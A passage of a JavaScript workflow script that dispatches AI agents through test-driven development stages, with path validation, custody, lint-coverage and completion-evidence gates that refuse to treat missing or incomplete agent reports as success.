// writes forever, every re-invocation re-runs finished tasks, and a completion
// report can never be reached. The marking goes through an agent because this
// runtime cannot touch the filesystem itself.
const doneStage = stage(
  function doneGuard(prev) {
    return !prev || prev.status !== 'verified' ? { skip: prev } : null;
  },
  async function doneBody(prev, task, index) {
    const dir = dirOf(task);
    const result = await editMarkerStage(task, index, {
      dispatchLabel: 'done',
      stageLabel: 'done',
      markerChar: 'x',
      successField: 'marked',
      failDetail: 'task was not marked [x]',
      schema: DONE_SCHEMA,
      prompt: [
        `STDD completion marking for task ${taskLabel(task)} in ${dir}.`,
        'The independent verifier has already passed this task. Your only job is to record that.',
        '',
        `1. In ${dir}/tasks.md, change this task's status marker from \`[wip]\` to \`[x]\`. Change nothing else on that line, and nothing else in the file.`,
        '2. Re-read that line after the edit and return it verbatim in markerLine.',
        `3. Append \`DONE ${task.id}\` to ${dir}/.progress.log.`,
        '',
        `Do not touch \`${task.testFile}\`, the implementation, spec.md or design-ux.md. If the task line cannot be found, or does not currently read \`[wip]\`, set marked=false and explain in detail — do not edit something else to make it look right.`,
        REPORT_CONTRACT
      ].join('\n')
    });

    if (result.blocked) {
      return taskBlocked(task, 'done', result.detail);
    }

    return Object.assign({}, prev, { status: 'done', markerLine: result.markerLine });
  }
);

// --- phase 2: lint (dispatched, never reimplemented) ----------------------

async function runLint(dir) {
  return await agent(
    [
      `Run the STDD mechanical lint over ${dir} and return the findings.`,
      '',
      'Invoke the `stdd-lint` skill and let IT run every mechanical check catalogued in its `references/checklist.md` ' +
        'that is its own responsibility (S-31, the not-installed STOP rule, governs the caller instead — do not ' +
        'fabricate a row for it).',
      'stdd-lint is the single authority for what each check means: do not re-derive, re-implement, shortcut or supplement its logic, and do not substitute your own judgement for a check it defines.',
      'If the `stdd-lint` skill is not installed in this environment, return installed=false and an empty findings array — do not approximate the checks yourself.',
      '',
      'Return one row per check that ran, using its S-number, plus stdd-lint\'s combined report verbatim in rawReport. A check whose precondition is not met is SKIP, not FAIL.',
      `Each row's \`status\` field accepts ONLY these values: ${LINT_STATUSES.join(', ')} — inventing a new ` +
        'status value (e.g. ADVISORY) is not an available option. If you believe a finding is a mechanical ' +
        'false positive, still report it with the honest mechanical status (PASS/FAIL/SKIP/REPORT) and put your ' +
        'false-positive reasoning in that row\'s evidence field — never soften the status itself.',
      REPORT_CONTRACT
    ].join('\n'),
    {
      label: 'stdd-lint',
      phase: 'Lint',
      schema: LINT_SCHEMA,
      agentType: 'eagle-sentinel',
      model: 'sonnet',
      effort: 'low'
    }
  );
}

// --- main flow ------------------------------------------------------------

// REQ-05 (spec.md:340-356, tasks.md:303-323, D-15): every BLOCKED return from
// run() shares one pinned shape — status/stage/reason/reasons/change/
// custodyVerdictLine/fingerprints/blockedTasks — instead of the hand-written,
// drifted object literal each call site used to build directly (some carried
// `change`, some didn't; none carried `status`/`reason`). An unreached gate
// is always an explicit `null`, never an omitted key; `reasons[0]` always
// equals `reason`. `extra` may still add call-site-only fields (e.g.
// `remedy`, `notes`) on top of the pinned shape. Does not touch
// REVIEW_REQUIRED/COMPLETE/INCOMPLETE, which are out of REQ-05's scope (see
// spec.md `## Rejected options`).
function blocked(stage, reasons, extra) {
  const reasonList = Array.isArray(reasons) ? reasons : [reasons];
  return Object.assign(
    {
      status: 'blocked',
      stage: stage,
      reason: reasonList[0],
      reasons: reasonList,
      change: null,
      custodyVerdictLine: null,
      fingerprints: null,
      blockedTasks: null
    },
    extra || {}
  );
}

// H6: after the custody gate, every subsequent BLOCKED return in run() (and
// the gate functions extracted below) used to rebuild the same
// `{change, custodyVerdictLine, fingerprints}` triple by hand — ~14 copies,
// any one of which silently dropping a field would produce a BLOCKED with
// missing context. `ctx` is now built once (gateCustody, below) and threaded
// through the remaining gates; `blockedHere` is the partial application of
// `blocked()` against that one `ctx`.
function blockedHere(ctx, stage, reasons, extra) {
  return blocked(stage, reasons, Object.assign({}, ctx, extra || {}));
}

// H5: run()'s input-validation section, extracted verbatim as its own gate.
// Returns `{blocked}` — the value run() should return immediately — or the
// validated `{name, changeDir, decision}`.
function validateArgs(input) {
  const parsed = parsedArgs(input);
  const name = changeNameOf(parsed);
  if (!name) {
    return { blocked: blocked('Load & custody gate', 'no change name supplied — invoke with {change: "<name>"}') };
  }
  // Validated before the name reaches a prompt or a path. The rejected value
  // is reported JSON-escaped and truncated, and is never interpolated into a
  // dispatch prompt.
  if (!CHANGE_NAME_RE.test(name)) {
    return {
      blocked: blocked(
        'Load & custody gate',
        `change name rejected: must match ^[A-Za-z0-9._-]+$ and must not be '.' or '..' (one path segment, no separators, whitespace, or traversal). Got ${JSON.stringify(truncate(name, 60))}`
      )
    };
  }

  // REQ-18/S-23 (spec.md:903-906, :996-997): a confirmed, absolute changeDir
  // is now the SOLE source of the change directory — there is no legacy
  // `STDD/<name>` fallback left. A caller that omits the `changeDir` key
  // entirely (bare-string args, or an object with no `changeDir` key) can no
  // longer resolve a directory and BLOCKs the same as an explicitly empty,
  // relative, or unsafe-segment value — all by pure string checks, before
  // custody and before any dispatch (S-23a: calls[] stays empty).
  const changeDirSupplied = changeDirOf(parsed);
  if (typeof changeDirSupplied !== 'string' || !changeDirSupplied) {
    return {
      blocked: blocked(
        'Load & custody gate',
        `change-dir:missing — a confirmed, absolute changeDir is required. Got ${JSON.stringify(truncate(changeDirSupplied, 60))}`
      )
    };
  }
  // Adversarial-council finding D: a whole-path charset gate, checked before
  // changeDir is interpolated anywhere (the custody agent's shell command
  // string, or any prompt text) — an intermediate path segment can carry a
  // shell metacharacter or control character just as easily as the final
  // one, which the pre-existing `.`/`..`-segment + name-mismatch checks
  // below never covered.
  if (CHANGE_DIR_ILLEGAL_CHAR_RE.test(changeDirSupplied)) {
    return {
      blocked: blocked(
        'Load & custody gate',
        'change-dir:illegal-char — changeDir must contain only [A-Za-z0-9/._-] characters (no shell ' +
          'metacharacters, whitespace, or non-ASCII characters). This is a deliberate platform restriction, not an ' +
          'oversight: single-quoting alone cannot protect the prompt-injection path (a shell metacharacter still ' +
          'reaches an agent-written command string), so paths containing a space or non-ASCII character — e.g. ' +
          '"/Users/x/My Project/..." — are rejected outright. Move or symlink the change into a path using only ' +
          `[A-Za-z0-9/._-], then invoke again. Got ${JSON.stringify(truncate(changeDirSupplied, 200))}`
      )
    };
  }
  if (changeDirSupplied.charAt(0) !== '/') {
    return {
      blocked: blocked(
        'Load & custody gate',
        `change-dir:not-absolute — changeDir must be an absolute path. Got ${JSON.stringify(truncate(changeDirSupplied, 200))}`
      )
    };
  }
  const segments = changeDirSupplied.split('/').filter(function nonEmpty(part) {
    return part.length > 0;
  });
  if (segments.indexOf('.') !== -1 || segments.indexOf('..') !== -1) {
    return {
      blocked: blocked(
        'Load & custody gate',
        `change-dir:unsafe-segment — changeDir must not contain '.' or '..' path segments. Got ${JSON.stringify(truncate(changeDirSupplied, 200))}`
      )
    };
  }
  const finalSegment = lastSegment(changeDirSupplied);
  if (finalSegment !== name) {
    return {
      blocked: blocked(
        'Load & custody gate',
        `change-dir:name-mismatch — change "${name}" does not match changeDir's final path segment "${finalSegment}"`
      )
    };
  }

  return {
    blocked: null,
    name: name,
    changeDir: changeDirSupplied,
    decision: decisionOf(parsed),
    inputsHash: inputsHashOf(parsed)
  };
}

// H5/H6: the custody dispatch + verdict/task-count gate, extracted from
// run(). Builds the shared ctx (H6, above) as soon as custody exists, and
// returns it for gateLoad/gateLint/run() to reuse.
async function gateCustody(changeDir, name, inputsHash) {
  // REQ-18 non-repo-branch precondition, enforced by the workflow itself too
  // (S-26, closes orc K2b — the caller is not the only line of defense): a
  // confirmed changeDir whose spec.md does not exist SHALL BLOCK before any
  // write-capable dispatch. This is not a second check — the custody relay
  // (dispatched next) already reports `CUSTODY: FAIL reason=spec.md:missing`
  // for exactly this case (S-23b shares the same mechanism), and that
  // BLOCKED return happens before loadChange or any task-stage dispatch, so
  // no write-capable (reset-/red-/green-/fix-/done-) call is ever reached.
  phase('Load & custody gate');
  const custodyRelay = await custodyCheck(changeDir, inputsHash);
  const custody = readCustody(custodyRelay, name);
  const ctx = { change: name, custodyVerdictLine: custody.verdictLine, fingerprints: custody.fingerprints };
  if (custody.blockers.length > 0) {
    log(`custody gate REFUSED for ${changeDir}: ${custody.blockers.length} blocker(s)`);
    return {
      blocked: blockedHere(ctx, 'Load & custody gate', custody.blockers, {
        remedy: 'restore the artifact, or re-approve it and rewrite the fingerprint, then invoke again',
        notes: ''
      })
    };
  }
  log(`custody gate PASSED for ${changeDir}: ${custody.verdictLine}`);

  // REQ-20 G-02/G-04 (S-33): fail-closed, named separately from the
  // "Load & custody gate" phase blockers above — a well-formed CUSTODY: PASS
  // with an absent or malformed TASKS: count line is its own named stage
  // (`custody`), not folded into the verdict-line blockers, so a caller can
  // tell "the verdict itself is bad" apart from "the verdict is fine but its
  // task-count companion line is missing/malformed". M11-JS (2026-07-28):
  // "absent" (nothing produced at all — a schema-absent field, or the
  // script's own TASKS_MISSING_LINE literal for "no tasks.md exists") gets
  // its own reason `load:tasks-line-missing`, distinct from a genuinely
  // garbled line's `load:no-task-count` — both still fail-closed BLOCK here,
  // before loadChange is ever dispatched.
  if (custody.tasksLineProblem) {
    log(`custody gate task-count check REFUSED for ${changeDir}: ${custody.tasksLineProblem}`);
    return {
      blocked: blockedHere(
        ctx,
        'custody',
        custody.tasksLineAbsent ? 'load:tasks-line-missing' : 'load:no-task-count',
        {
          remedy: 'upgrade stdd_custody_check.py to print the TASKS: count line, then invoke again',
          notes: custody.tasksLineProblem
        }
      )
    };
  }

  return { blocked: null, custody: custody, custodyRelay: custodyRelay, ctx: ctx };
}

// H5: run()'s load gate, extracted — reads tasks.md via loadChange, checks
// spec status/task shape/manual checklist safety, and cross-checks the task
// count against the custody script's own TASKS: line.
async function gateLoad(changeDir, custodyRelay, ctx, inputsHash) {
  const load = await loadChange(changeDir, inputsHash);
  if (!load) {
    return {
      blocked: blockedHere(ctx, 'Load & custody gate', `could not read ${changeDir} — the load dispatch returned nothing`)
    };
  }

  // The custody program does not read `status` — it owns the fingerprint
  // comparison only. This one field therefore remains agent-reported, and is
  // the weaker half of this gate; see the skill's honest-limits section.
  const loadBlockers = [];
  if (load.specStatus !== 'approved') {
    loadBlockers.push(`spec.md status is "${truncate(load.specStatus, 40) || '(absent)'}", not "approved"`);
  }
  const rawTasks = load.tasks || [];
  loadBlockers.push.apply(loadBlockers, taskShapeBlockers(rawTasks));
  if (loadBlockers.length > 0) {
    return { blocked: blockedHere(ctx, 'Load & custody gate', loadBlockers, { notes: load.notes || '' }) };
  }

  // Self-reported gap (dispatch follow-up to J1, 2026-07-28): validated at
  // this same load gate, fail-closed, before manualChecklist ever reaches
  // the Manual gate phase below — its own named reason tag below, separate
  // from the generic loadBlockers above, since it checks a different array
  // (manualChecklist, not tasks).
  const manualBlockers = manualChecklistBlockers(load.manualChecklist || []);
  if (manualBlockers.length > 0) {
    return {
      blocked: blockedHere(
        ctx,
        'Load & custody gate',
        `load:unsafe-manual-checklist — ${manualBlockers.join('; ')}`,
        { notes: load.notes || '' }
      )
    };
  }

  // S-29/REQ-20 G-01: loadChange's claimed task array is cross-checked
  // against the custody script's own TASKS: line (when one was relayed) — a
  // producer that silently truncates tasks.md is caught here, fail-closed,
  // instead of being trusted.
  const reconcileBlockers = reconcileTaskCount(custodyRelay && custodyRelay.tasksLine, rawTasks);
  if (reconcileBlockers.length > 0) {
    return { blocked: blockedHere(ctx, 'load:incomplete', reconcileBlockers, { notes: load.notes || '' }) };
  }

  // REQ-20 gap-closure: the multiset check above has already passed, so
  // `rawTasks` is known to carry exactly the TASKS: line's ids — reorder
  // them to that trusted sequence before anything downstream (openTddTasks,
  // the pipeline) ever sees them. Logged only when a reorder actually
  // happened, so a persistently mis-ordering load agent stays visible
  // rather than silently accommodated forever.
  const orderedTasks = reorderTasksToTasksLine(custodyRelay && custodyRelay.tasksLine, rawTasks);
  const wasReordered = orderedTasks.some(function movedFromOriginal(task, index) {
    return task !== rawTasks[index];
  });
  if (wasReordered) {
    log(
      `load:reordered — loadChange's task array did not match tasks.md's true order; reordered to the custody script's TASKS: line ids= sequence before execution`
    );
  }

  const tasks = orderedTasks.map(function attach(task) {
    return Object.assign({}, task, { changeDir: changeDir, inputsHash: inputsHash });
  });
  const tddTasks = tasks.filter(isTddTask);
  // Includes 'wip' as open, not just 'todo': a task interrupted mid-run is
  // still open work. resetWipStage (first stage in the pipeline below) resets
  // a 'wip' marker back to unstarted before redStage redoes RED, so resuming
  // it here no longer deadlocks against hooks/stdd_test_guard.py's [wip]-block.
  const openTddTasks = tddTasks.filter(function isOpen(task) {
    return task.marker !== 'done';
  });
  const alreadyDoneCount = tddTasks.length - openTddTasks.length;

  return {
    blocked: null,
    load: load,
    tddTasks: tddTasks,
    openTddTasks: openTddTasks,
    alreadyDoneCount: alreadyDoneCount
  };
}

// H5: run()'s lint gate, extracted — dispatches stdd-lint and checks its
// findings/rawReport/coverage shape; never re-derives a check's meaning.
async function gateLint(changeDir, ctx, blockedTasks) {
  phase('Lint');
  const lint = await runLint(changeDir);
  if (!lint) {
    return {
      blocked: blockedHere(ctx, 'Lint', 'the lint dispatch returned nothing — mechanical check incomplete', {
        blockedTasks: blockedTasks
      })
    };
  }
  if (!lint.installed) {
    return {
      blocked: blockedHere(ctx, 'Lint', '`/stdd-lint` not installed - mechanical check incomplete', {
        blockedTasks: blockedTasks
      })
    };
  }
  const findings = lint.findings || [];
  const rawReport = String(lint.rawReport === null || lint.rawReport === undefined ? '' : lint.rawReport);
  // Adversarial-council finding F: an installed=true lint dispatch that
  // returns findings: [] used to read as "all checks passed" — the FAIL
  // filter below sees nothing to filter, so it could not tell a genuinely
  // clean run apart from one where stdd-lint silently ran nothing at all.
  //
  // Adversarial-council finding N2: the fix for finding F used to gate on
  // `findings.length < LINT_CHECK_COUNT` with LINT_CHECK_COUNT hardcoded to
  // 13 — but stdd-skills/stdd-lint/references/checklist.md's own S-31 row
  // states that rule governs the CALLER (stdd-spec/stdd-plan/stdd-execute),
  // not stdd-lint itself, so a real, clean stdd-lint run reports at most 12
  // rows (S-26/27/28/29/30/40/53/54/55/56/57/58) — the 13-row floor would
  // have BLOCKED every clean run (this workflow already enforces S-31
  // itself, above, via the `!lint.installed` check). The faithful signal for
  // "installed=true but nothing ran" is an empty findings array or an
  // empty/whitespace rawReport, not a specific row count that the checklist
  // is free to grow or shrink without this gate needing to change.
  if (findings.length === 0 || rawReport.trim() === '') {
    return {
      blocked: blockedHere(
        ctx,
        'Lint',
        'lint:no-report — stdd-lint reported ' +
          `${findings.length} finding(s) and rawReport was ${rawReport.trim() === '' ? 'empty' : 'non-empty'}; ` +
          'refusing to read an empty report as clean',
        { blockedTasks: blockedTasks }
      )
    };
  }
  const unknownStatuses = findings.filter(function unknown(finding) {
    return LINT_STATUSES.indexOf(finding.status) === -1;
  });
  if (unknownStatuses.length > 0) {
    return {
      blocked: blockedHere(
        ctx,
        'Lint',
        unknownStatuses.map(function describe(finding) {
          return `lint finding ${finding.check || '(unnamed)'} carries an unrecognised status "${truncate(finding.status, 40)}" — refusing to read it as anything other than a failure`;
        }),
        { blockedTasks: blockedTasks }
      )
    };
  }
  // Adversarial-council finding J2 (round 3): the finding-F/N2 fix above
  // only checks findings.length === 0 (an empty array) and rawReport
  // emptiness — it never checks WHICH S-IDs were actually reported, so a
  // report carrying a single row (e.g. only S-26, PASS) with a non-empty
  // rawReport reads as clean, silently dropping coverage of the other 11
  // checks. A count floor was already rejected once (finding N2, above) —
  // this is a per-check COVERAGE gate instead, immune to the checklist
  // simply growing or shrinking its row count for an unrelated reason, but
  // still catching a dispatch that quietly narrowed its own scope.
  // EXPECTED_LINT_S_IDS is deliberately NOT the count-only pattern N2
  // rejected: an all-SKIP report naming all 12 ids is legitimate (e.g. a
  // change with no design docs skips every design-cross-reference check) and
  // is NOT blocked here — only a MISSING id is.
  const reportedSIds = findings.map(function idOf(finding) {
    return finding.sId;
  });
  const missingSIds = EXPECTED_LINT_S_IDS.filter(function absent(id) {
    return reportedSIds.indexOf(id) === -1;
  });
  if (missingSIds.length > 0) {
    return {
      blocked: blockedHere(
        ctx,
        'Lint',
        `lint:incomplete-report — stdd-lint's report is missing ${missingSIds.length} of the ` +
          `${EXPECTED_LINT_S_IDS.length} expected check(s): ${missingSIds.join(', ')}`,
        { blockedTasks: blockedTasks }
      )
    };
  }
  const lintFailures = findings.filter(function failed(finding) {
    return finding.status === 'FAIL';
  });

  return { blocked: null, lint: lint, lintFailures: lintFailures };
}

// H5: run()'s Manual gate + Completion report assembly, extracted.
function buildReport(params) {
  const decision = params.decision;
  const name = params.name;
  const load = params.load;
  const custody = params.custody;
  const changeDir = params.changeDir;
  const tddTasks = params.tddTasks;
  const completedCount = params.completedCount;
  const blockedTasks = params.blockedTasks;
  const recoveredTasks = params.recoveredTasks;
  const lintFailures = params.lintFailures;
  const lint = params.lint;

  phase('Manual gate');
  const checklist = load.manualChecklist || [];
  const artifacts = {
    spec: `${changeDir}/spec.md`,
    tasks: `${changeDir}/tasks.md`,
    designUx: load.designUxExists ? `${changeDir}/design-ux.md` : null,
    progressLog: `${changeDir}/.progress.log`
  };

  if (!decision) {
    return {
      result: 'REVIEW_REQUIRED',
      phase: 'Manual gate',
      change: name,
      timestamp: load.timestamp,
      custodyVerdictLine: custody.verdictLine,
      artifacts: artifacts,
      tddTaskCount: tddTasks.length,
      completedTasks: completedCount,
      blockedTasks: blockedTasks,
      recoveredTasks: recoveredTasks,
      lintFailures: lintFailures,
      lintReport: lint.rawReport || '',
      manualChecklist: checklist,
      askUser:
        'Present each checklist entry to the user as selectable options (confirmed / not confirmed / not applicable) — never as a typed keyword — then re-invoke this workflow with {change, decision: {approved, confirmed: [ids]}}. The unconfirmed set is derived from the checklist; supplying it has no effect.',
      reviewOptions: ['approve completion', 'send blocked items back', 'stop and re-plan']
    };
  }

  phase('Completion report');
  // The human gate is DERIVED, never accepted from the caller. It used to read
  // `decision.unconfirmed || <derived>`, and `[]` is truthy in JS, so
  // {approved: true, unconfirmed: []} produced a COMPLETE report that also
  // said "0/N confirmed". Only `confirmed` comes from the caller, and it is
  // intersected with the checklist the load dispatch actually read, so an id
  // that is not on the checklist confirms nothing.
  const claimed = Array.isArray(decision.confirmed) ? decision.confirmed : [];
  const checklistIds = checklist.map(function idOf(entry) {
    return entry.id;
  });
  const confirmed = checklistIds.filter(function wasConfirmed(id) {
    return claimed.indexOf(id) !== -1;
  });
  const unconfirmed = checklistIds.filter(function notConfirmed(id) {
    return confirmed.indexOf(id) === -1;
  });

  // Completion needs positive evidence, not merely the absence of failures:
  // zero tasks plus an empty checklist plus {approved: true} is a claim about
  // nothing.
  const evidenceBlockers = [];
  if (tddTasks.length === 0 && checklist.length === 0) {
    evidenceBlockers.push(
      'no TDD tasks and no manual verification checklist entries — there is no evidence of work to declare complete'
    );
  }
  if (tddTasks.length > 0 && completedCount === 0) {
    evidenceBlockers.push(
      `none of the ${tddTasks.length} TDD task(s) reached a verified-and-marked state`
    );
  }

  const complete =
    decision.approved === true &&
    evidenceBlockers.length === 0 &&
    unconfirmed.length === 0 &&
    blockedTasks.length === 0 &&
    lintFailures.length === 0;

  const lines = [
    `STDD change: ${name} (${load.timestamp})`,
    `Custody: ${custody.verdictLine}`,
    tddTasks.length === 0
      ? '0 TDD tasks — completion is the full confirmation of the manual verification checklist'
      : `TDD tasks: ${completedCount}/${tddTasks.length} verified and marked [x]`,
    `Lint: ${lintFailures.length} FAIL finding(s)`,
    `Manual verification checklist: ${confirmed.length}/${checklist.length} confirmed`,
    'Approval: caller-supplied and unauthenticated — this workflow cannot tell an approval a human gave from one a caller invented.'
  ];
  if (unconfirmed.length > 0) {
    // Wording mandated by the skill: it must not be softened, and the report
    // must not claim completion while any item is unconfirmed.
    lines.push(`manual verification incomplete: ${unconfirmed.length} items`);
    lines.push(`unconfirmed: ${unconfirmed.join(', ')}`);
  }
  evidenceBlockers.forEach(function push(reason) {
    lines.push(`no completion evidence: ${reason}`);
  });
  if (blockedTasks.length > 0) {
    lines.push(
      `blocked tasks: ${blockedTasks
        .map(function describe(entry) {
          return `${(entry.task && entry.task.id) || '?'} (${entry.stage}: ${entry.detail})`;
        })
        .join('; ')}`
    );
  }
  if (recoveredTasks.length > 0) {
    // REQ-01: never report a recovered task's evidence identically to a
    // normally-verified task's — this is only ever populated in the same
    // call as the pipeline run that recovered it (see recoveredTasks above);
    // a later re-invocation with `decision` (the usual two-call pattern)
    // does not re-derive this, since no recovery state is persisted to disk.
    lines.push(
      `recovered tasks: ${recoveredTasks
        .map(function describe(entry) {
          return `${entry.id || '?'} (${entry.label})`;
        })
        .join('; ')}`
    );
  }
  if (!complete) {
    lines.push('NOT complete — see the items above.');
  }

  return {
    result: complete ? 'COMPLETE' : 'INCOMPLETE',
    phase: 'Completion report',
    change: name,
    claimsCompletion: complete,
    approvalIsUnauthenticated: true,
    custodyVerdictLine: custody.verdictLine,
    tddTaskCount: tddTasks.length,
    completedTasks: completedCount,
    manualVerificationIncomplete: unconfirmed.length,
    confirmed: confirmed,
    unconfirmed: unconfirmed,
    evidenceBlockers: evidenceBlockers,
    blockedTasks: blockedTasks,
    recoveredTasks: recoveredTasks,
    lintFailures: lintFailures,
    artifacts: artifacts,
    report: lines.join('\n')
  };
}

async function run(input) {
  const validated = validateArgs(input);
  if (validated.blocked) {
    return validated.blocked;
  }
  const name = validated.name;
  const changeDir = validated.changeDir;
  const decision = validated.decision;
  const inputsHash = validated.inputsHash;

  const custodyGate = await gateCustody(changeDir, name, inputsHash);
  if (custodyGate.blocked) {
    return custodyGate.blocked;
  }
  const custody = custodyGate.custody;
  const custodyRelay = custodyGate.custodyRelay;
  const ctx = custodyGate.ctx;

  const loadGate = await gateLoad(changeDir, custodyRelay, ctx, inputsHash);
  if (loadGate.blocked) {
    return loadGate.blocked;
  }
  const load = loadGate.load;
  const tddTasks = loadGate.tddTasks;
  const openTddTasks = loadGate.openTddTasks;
  const alreadyDoneCount = loadGate.alreadyDoneCount;

  let taskResults = [];
  let blockedTasks = [];
  let completedThisRun = 0;
  // REQ-01 (spec.md:78-81): tasks completed via the GREEN-recovery path
  // (resetWipStage's exit-0 probe, recoveryLabel set at :814) must not be
  // reported identically to a normally-verified task — collected here from
  // `normalized` so the completion-report evidence can label them distinctly
  // (read below, was previously carried through doneStage/verifyStage but
  // never read by any report).
  let recoveredTasks = [];

  if (decision) {
    // A decision means the caller has already been through the manual gate.
    // Re-running the pipeline here would re-execute finished work; the
    // evidence of completion is the `[x]` markers this workflow wrote, read
    // back from tasks.md by the load dispatch above.
    log(`decision supplied — skipping task execution; ${alreadyDoneCount}/${tddTasks.length} TDD task(s) are marked done in tasks.md`);
    blockedTasks = openTddTasks.map(function stillOpen(task) {
      return taskBlocked(
        task,
        'execute',
        `still marked [${task.marker}] in tasks.md — never carried through to a verified, marked-done state`
      );
    });
  } else {
    phase('Execute tasks');

    // M2 (token-reduction): infra tasks no longer fan out through pipeline()
    // alongside scenario tasks — they are driven serially, in tasks.md order,
    // through the exact same stage chain pipeline() would otherwise use, and
    // BEFORE pipeline() is ever invoked. An infra task blocking here stops
    // the run before the (usually much larger) scenario fan-out ever starts,
    // rather than letting pipeline() burn tokens on scenarios that a broken
    // infra prerequisite would invalidate anyway.
    const openInfraTasks = openTddTasks.filter(function isInfra(task) {
      return task.kind === 'infra';
    });
    const openScenarioTasks = openTddTasks.filter(function isScenario(task) {
      return task.kind !== 'infra';
    });

    const infraResults = [];
    for (let index = 0; index < openInfraTasks.length; index += 1) {
      let prev = await resetWipStage(undefined, openInfraTasks[index], index);
      prev = await redStage(prev, openInfraTasks[index], index);
      prev = await greenStage(prev, openInfraTasks[index], index);
      prev = await verifyStage(prev, openInfraTasks[index], index);
      prev = await doneStage(prev, openInfraTasks[index], index);
      infraResults.push(prev);
    }
    const infraNormalized = infraResults.map(function normalizeInfra(entry, index) {
      if (!entry) {
        return taskBlocked(openInfraTasks[index], 'unknown', 'stage threw; item dropped');
      }
      return entry;
    });
    const infraBlockedTasks = infraNormalized.filter(function isBlocked(entry) {
      return entry.status !== 'done';
    });

    if (infraBlockedTasks.length > 0) {
      return blockedHere(
        ctx,
        'Execute tasks',
        infraBlockedTasks.map(function describe(entry) {
          return `infra task ${entry.task && entry.task.id} blocked at stage ${entry.stage}: ${entry.detail}`;
        }),
        { blockedTasks: infraBlockedTasks }
      );
    }

    if (openScenarioTasks.length === 0) {
      log('0 open scenario TDD tasks to run (all infra/done, or a manual-only change)');
    } else {
      taskResults = await pipeline(openScenarioTasks, resetWipStage, redStage, greenStage, verifyStage, doneStage);
    }

    // A short result array used to be mapped over while the denominator came
    // from the task list, so 2 results for 3 tasks reported "3/3". Accounting
    // that does not add up blocks instead.
    if (taskResults.length !== openScenarioTasks.length) {
      return blockedHere(
        ctx,
        'Execute tasks',
        `task accounting is incomplete: the pipeline returned ${taskResults.length} result(s) for ${openScenarioTasks.length} task(s), so no per-task count can be trusted`
      );
    }

    const scenarioNormalized = taskResults.map(function normalize(entry, index) {
      if (!entry) {
        return taskBlocked(openScenarioTasks[index], 'unknown', 'stage threw; item dropped');
      }
      return entry;
    });
    // Only the terminal 'done' status counts as success. Every other value,
    // including one this script does not know, is blocked — an unexpected
    // state never falls through to success. The infra results are folded in
    // here too (all 'done' by construction — the infraBlockedTasks check
    // above already returned early otherwise) so completedCount/recoveredTasks
    // account for infra work as well as scenario work.
    const normalized = infraNormalized.concat(scenarioNormalized);
    blockedTasks = normalized.filter(function isBlocked(entry) {
      return entry.status !== 'done';
    });
    completedThisRun = normalized.length - blockedTasks.length;
    recoveredTasks = normalized
      .filter(function wasRecovered(entry) {
        return entry.status === 'done' && entry.recovery === true;
      })
      .map(function describe(entry) {
        return { id: entry.task && entry.task.id, label: entry.recoveryLabel || 'recovery: RED-checkpoint unavailable' };
      });
  }

  const completedCount = alreadyDoneCount + completedThisRun;

  const lintGate = await gateLint(changeDir, ctx, blockedTasks);
  if (lintGate.blocked) {
    return lintGate.blocked;
  }
  const lint = lintGate.lint;
  const lintFailures = lintGate.lintFailures;

  return buildReport({
    decision: decision,
    name: name,
    load: load,
    custody: custody,
    changeDir: changeDir,
    tddTasks: tddTasks,
    completedCount: completedCount,
    blockedTasks: blockedTasks,
    recoveredTasks: recoveredTasks,
    lintFailures: lintFailures,
    lint: lint
  });
}

const outcome = await run(args);
// REQ-05 pinned two different shapes: BLOCKED carries `status`/`stage`
// (:1121-1136 `blocked()`), everything else (REVIEW_REQUIRED/COMPLETE/
// INCOMPLETE) still carries the legacy `result`/`phase` pair — reading
// `result`/`phase` unconditionally printed "undefined (undefined)" for
// every BLOCKED outcome after the REQ-05 rename.
log(
  `stdd-execute outcome: ${outcome.status === 'blocked' ? `BLOCKED (${outcome.stage})` : `${outcome.result} (${outcome.phase})`}`
);
log(JSON.stringify(outcome, null, 2));
return outcome;
